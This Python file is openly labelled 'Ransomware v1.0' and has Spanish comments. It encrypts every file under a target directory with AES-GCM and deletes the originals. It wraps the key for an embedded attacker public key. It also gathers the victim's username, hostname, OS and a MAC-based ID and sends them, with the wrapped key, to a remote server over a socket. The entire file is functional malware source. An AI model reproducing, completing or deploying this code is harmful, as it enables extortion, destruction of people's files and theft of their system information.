from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
import os
import hashlib
from getmac import get_mac_address
import base64
import json
import platform
import getpass
import socket

# Ransomware v1.0
ATTACKER_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEgmBlREjfH2x3683dyOZii4olhCsr
Hm78xilMiU5Mnp3xquB7xXp964hJBTajhk1mA+FgET6aGY7rgTMiPrSwrQ==
-----END PUBLIC KEY-----"""

ATTACKER_PUBLIC_KEY = serialization.load_pem_public_key(ATTACKER_PUBLIC_KEY_PEM)
TARGET_DIR = r"C:\Ransomware\Files" # Cambia esta ruta al directorio que deseas encriptar

def generate_aes_key():
    return os.urandom(32)

def encrypt_file(file_path, aes_key):
    try:
        iv = os.urandom(12)
        cipher = Cipher(algorithms.AES(aes_key), modes.GCM(iv))
        encryptor = cipher.encryptor()
        
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        with open(file_path + '.enc', 'wb') as f:
            f.write(iv + ciphertext + encryptor.tag)
        os.remove(file_path)
        return True
    except (FileNotFoundError, PermissionError, IOError) as e:
        print(f"[!] Error en la encriptacion de {file_path}: {e}")
        return False

def encrypt_aes_key_with_ecies(aes_key, attacker_public_key):
    try:
        ephemeral_private_key = ec.generate_private_key(ec.SECP256R1())
        ephemeral_public_key = ephemeral_private_key.public_key()
        
        shared_secret = ephemeral_private_key.exchange(ec.ECDH(), attacker_public_key)
        
        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=64,
            salt=os.urandom(16),
            info=b'ecies_ransomware'
        )

        derived_key = hkdf.derive(shared_secret)
        enc_key = derived_key[:32]
        mac_key = derived_key[32:]

        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(enc_key), modes.CTR(iv))
        encryptor = cipher.encryptor()
        encrypt_aes_key = encryptor.update(aes_key) + encryptor.finalize()

        h = hmac.HMAC(mac_key, hashes.SHA256())
        h.update(encrypt_aes_key)
        mac = h.finalize()

        ephemeral_public_key_bytes = ephemeral_public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        return iv + encrypt_aes_key + mac, ephemeral_public_key_bytes
    
    except Exception as e:
        print(f"[!] Error en ECIES: {e}")
        return None, None

def ransomware(directory_path, client):
    try:
        victim_id = hashlib.sha256(get_mac_address().encode()).hexdigest()
        username = getpass.getuser()
        hostname = socket.gethostname()
        os_info = f"{platform.system()} {platform.release()}"

        # Siempre recopila la información básica del sistema
        data = {
            "type": "initial_info", # Nuevo campo para identificar el tipo de mensaje
            "victim_id": victim_id,
            "username": username,
            "hostname": hostname,
            "os_info": os_info,
            "encrypted_key": None, # Se establece a None inicialmente
            "ephemeral_public_key": None
        }

        aes_key = generate_aes_key()
        encrypted_files_count = 0

        # Intenta encriptar los archivos
        try:
            for root, _, files in os.walk(directory_path):
                for file_name in files:
                    file_path = os.path.join(root, file_name)
                    if encrypt_file(file_path, aes_key):
                        encrypted_files_count += 1
            print(f"[*] Archivos encriptados: {encrypted_files_count}")

            encrypted_aes_key, ephemeral_public_key = encrypt_aes_key_with_ecies(aes_key, ATTACKER_PUBLIC_KEY)
            if encrypted_aes_key and ephemeral_public_key:
                data["encrypted_key"] = base64.b64encode(encrypted_aes_key).decode('utf-8')
                data["ephemeral_public_key"] = base64.b64encode(ephemeral_public_key).decode('utf-8')
                print("[*] Clave AES encriptada y clave pública efímera generadas.")
            else:
                print("[!] Fallo al encriptar la clave AES. La clave no se enviará.")

        except Exception as e:
            print(f"[!] Error durante la encriptación de archivos o generación de claves: {e}")
            # Si ocurre un error aquí, la información básica del sistema aún puede enviarse

        # Envía la información recopilada al servidor
        try:
            client.sendall(json.dumps(data).encode("utf-8") + b"\n") # Usar sendall para asegurar que se envía todo
            print("[*] Información inicial del equipo y clave (si disponible) enviada al servidor.")
        except Exception as e:
            print(f"[!] Error al enviar los datos JSON al servidor: {e}")

        return data # Devuelve la información enviada

    except Exception as e:
        print(f"[!] Error general en la función ransomware: {e}")
        # Aquí podrías considerar enviar un mensaje de error básico al servidor si la conexión sigue activa
        return None
